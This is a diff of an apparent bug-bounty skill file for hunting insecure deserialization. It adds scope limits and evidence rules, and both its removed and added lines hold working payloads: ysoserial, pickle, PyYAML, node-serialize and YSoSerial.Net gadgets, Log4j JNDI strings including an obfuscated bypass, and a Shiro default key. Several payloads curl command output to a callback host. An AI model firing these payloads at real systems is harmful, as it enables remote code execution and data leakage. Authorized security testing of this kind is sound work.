@@ -1,170 +1,73 @@
 ---
 name: hunt-deserialization
-description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
+description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. URLDNS or a JNDI lookup is not RCE until a command callback lands. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
 sources: hackerone_public
 report_count: 22
 ---
 
-# HUNT-DESERIALIZATION — Insecure Deserialization
+# HUNT-DESERIALIZATION — Untrusted object decode
 
-## Crown Jewel Targets
+The server turns bytes you control into objects. Impact depends on the gadget that actually runs. A changed error, a `rememberMe` cookie, or a DNS lookup from `URLDNS` proves **decode or JNDI lookup**, not code execution. Claim the step you reached.
 
-Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.
+## Rails
+- In-scope only. One callback or one `id`.
+- No exploit-kit spray, no gadget brute force, no hashcat on ViewState/Shiro keys, no webshell.
+- Do not enable remote class loading, do not load a JAR, do not `MODULE LOAD`.
+- Known **default** product keys (one public Shiro key) are a single test, not a wordlist.
+- Stop at draft. Never auto-submit.
+- After JDK 8u191 / 11.0.1, a remote JNDI codebase is off by default. An LDAP lookup is not automatically RCE.
 
-**Highest-value chains:**
-- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
-- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
-- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
-- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
-- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
-- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE
+## Decision tree
 
----
+1. **Identify the format** from the bytes, not the framework logo.
 
-## Attack Surface Signals
+   | Magic / shape | Format |
+   |---|---|
+   | `AC ED 00 05` or base64 `rO0AB` | Java serialization |
+   | `Content-Type: application/x-java-serialized-object`, `/invoker/`, `/wls-wsat/`, `/jmx-console/` | Java gadget sink |
+   | Cookie `rememberMe=` (Shiro) | AES-wrapped Java serialization |
+   | `O:<len>:"Class"` / `a:` / `C:` | PHP `unserialize` or `phar` metadata |
+   | `\x80\x02`–`\x80\x05` or base64 `gASV` | Python pickle |
+   | YAML `!!python/object` or `!!javax.script` | Unsafe YAML |
+   | JSON `"@type"` / `["com.sun....", {` | Fastjson / Jackson default typing |
+   | `\x04\x08` | Ruby Marshal |
+   | `__VIEWSTATE` | .NET ViewState (LosFormatter / ObjectStateFormatter) |
+   | `${jndi:` in a field that is logged | Log4j lookup — not Java serialization, same proof rules |
 
-### Detection Patterns
-```bash
-# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
-echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05
-
-# PHP serialization: O:8:"stdClass":0:{}
-# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02
-
-# Apache Shiro: rememberMe cookie present
-curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"
-
-# Log4j: test user-controlled fields for JNDI interpolation
-curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
-```
-
-### Header / Cookie Signals
-```
-Content-Type: application/x-java-serialized-object
-Cookie containing rO0= prefix (Java base64 serialized)
-Cookie: rememberMe= (Apache Shiro)
-Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
-Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
-```
-
----
-
-## Step-by-Step Hunting Methodology
-
-### Phase 1 — Java Deserialization (ysoserial)
-```bash
-# Install ysoserial
-wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
-
-# Generate OOB detection payload
-java -jar ysoserial-all.jar CommonsCollections6 \
-  'curl http://COLLAB_HOST/ysoserial' | base64 -w0
-
-# Send as body or cookie
-java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
-  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
-    -H "Content-Type: application/x-java-serialized-object" \
-    --data-binary @-
-
-# Apache Shiro exploit (default AES key)
-python3 shiro_exploit.py -u https://$TARGET/ -c "id"
-```
-
-### Phase 2 — PHP Object Injection
-```bash
-# Find unserialize() calls in source
-grep -r "unserialize(" --include="*.php" .
-
-# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
-# Send in cookie, POST param, or hidden form field
-# If error changes → deserialization confirmed
-
-# Craft gadget chain using phpggc
-git clone https://github.com/ambionics/phpggc
-php phpggc -l  # list chains
-php phpggc Laravel/RCE5 system id | base64
-```
-
-### Phase 3 — Python Pickle
-```bash
-# Generate OOB payload
-python3 -c "
-import pickle, os, base64
-class Exploit(object):
-    def __reduce__(self):
-        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
-print(base64.b64encode(pickle.dumps(Exploit())).decode())
-"
-
-# Send as cookie or POST body
-curl -s https://$TARGET/api/load-model \
-  -H "Content-Type: application/octet-stream" \
-  --data-binary @payload.pkl
-```
-
-### Phase 4 — .NET ViewState
-```bash
-# Check if ViewState is unsigned (MAC disabled)
-# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC
-
-# YSoSerial.Net
-dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
-  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
-```
-
-### Phase 5 — Log4Shell / JNDI
-```bash
-# Test all user-controlled inputs
-COLLAB="COLLAB_HOST"
-for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
-  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
-done
-
-# Test POST body fields
-curl -s -X POST https://$TARGET/api/login \
-  -H "Content-Type: application/json" \
-  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
-```
-
-### Phase 6 — Ruby Marshal
-```bash
-# Look for Marshal.load in source
-grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
-
-# Gem::Requirement gadget chain via marshalable objects
-# Use ruby-advisory-db gadgets
-```
-
----
-
-## Chain Table
-
-| Deserialization signal | Chain to | Impact |
-|-----------------------|----------|--------|
-| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
-| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
-| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
-| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |
-
----
-
-## Automation
-```bash
-# OOB listener
-interactsh-client -v -n 5
-
-# JNDI exploit kit
-git clone https://github.com/pimps/JNDI-Exploit-Kit
-```
-
----
+2. **Benign confirmation first.**
+   - Java: `ysoserial URLDNS http://UNIQUE.collab/` — DNS hit means the bytes were deserialized. No library dependency. **Not RCE.**
+   - Fastjson: `{"@type":"java.net.Inet4Address","val":"UNIQUE.collab"}` — DNS means autoType/lookup. **Not RCE.**
+   - PHP: only a side effect counts (OOB from a real POP chain, or a property that changes a later response). A 500 on a truncated `O:` string does not.
+   - Pickle / Marshal / BinaryFormatter: go straight to a single OOB gadget; there is no safe "half" execute.
+   - ViewState: flip one byte. If the app still accepts it, MAC is off. If it 500s with a MAC error, stop unless you already **read** the machineKey from a file (`hunt-lfi`). Do not crack the key.
+3. **Code execution, one gadget that matches what you know is loaded.**
+   - Java commons-collections 3.1 → `CommonsCollections6`; 4.x → `CommonsCollections2`; Spring on the classpath → `Spring1`; otherwise stop after URLDNS and say which libraries you actually saw (JAR name, error class).
+   - PHP → `phpggc` for the framework the error traces name (Laravel, Symfony, Monolog, Guzzle, Magento). Current chains, not a 2016 `__wakeup` copied from a blog. Command: `curl http://UNIQUE.collab/$(whoami)`.
+   - Python pickle `__reduce__` → `os.system` or `curl`. PyYAML: `!!python/object/apply:os.system ["curl http://UNIQUE.collab/"]`.
+   - Ruby: `Gem::Requirement` / `Gem::Installer` only if `YAML.load` / `Marshal.load` is the sink and the callback fires.
+   - .NET: `ysoserial.net` `TypeConfuseDelegate` only with a **disabled MAC** or a key you read from config. One `curl`.
+   - Node `node-serialize`: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').execSync('curl http://UNIQUE.collab/'+process.env.USER)}()"}`.
+   - Jackson default typing: `JdbcRowSetImpl` with `dataSourceName: ldap://UNIQUE.collab/a` and `autoCommit: true`. LDAP hit = gadget ran. RCE only if you also get command evidence and the JDK still loads remote code, or a local gadget returns output.
+4. **Log4j.** `${jndi:dns://UNIQUE.collab/a}` on one user-controlled field that is likely logged (User-Agent, username, a search box). DNS = lookup works. `${jndi:ldap://...}` follow-up fetch = JNDI client. Command callback = RCE. Obfuscation when the literal is stripped: `${${lower:j}ndi:${lower:d}ns://UNIQUE.collab/a}`. Versions 2.15 through 2.17 had bypasses; 2.17.1+ disabled the lookup. Do not claim RCE from DNS alone.
+5. **Shiro.** One request with the public default key `kPH+bIxk5D2deZiIxcaaaA==` (CVE-2016-4437) wrapping a URLDNS or a curl gadget. If the cookie does not decode, stop. Do not run a key list.
 
 ## Validation
+| Evidence | Claim |
+|---|---|
+| DNS from URLDNS / Inet4Address / `${jndi:dns}` | Deserialization or JNDI lookup. Not RCE |
+| LDAP/HTTP fetch of your reference | JNDI/gadget started. Not RCE unless the next row is true |
+| HTTP callback path contains `whoami`/`uid`, or body prints it | RCE as that user |
+| ViewState byte flip accepted | MAC disabled. RCE only after a forged payload runs |
+| PHP 500 on bad `O:` | Nothing |
 
-✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
-✅ Command output in response: full RCE confirmed
+Repeat a flaky callback once with a new unique host. Timing side channels need n≥10; prefer the DNS proof.
 
-**Severity:** Almost always **Critical** — RCE with server process privileges.
+## Chains
+- LFI/XXE of `web.config` or `application.yml` yields a key → then, and only then, forge ViewState or a signed token. One command.
+- `phar://` on a file you uploaded → PHP unserialize of metadata. Same POP rules.
+- SQLi `INTO OUTFILE` or upload of a serialized blob that a worker unpickles later (second order). Trigger the worker once.
+- SSRF to a loopback Java invoker or Jenkins CLI. One gadget.
+- Prototype pollution is not deserialization; if the sink is `child_process`, prove it under `hunt-rce`.
 
 ## Before you report — dedup gate
 
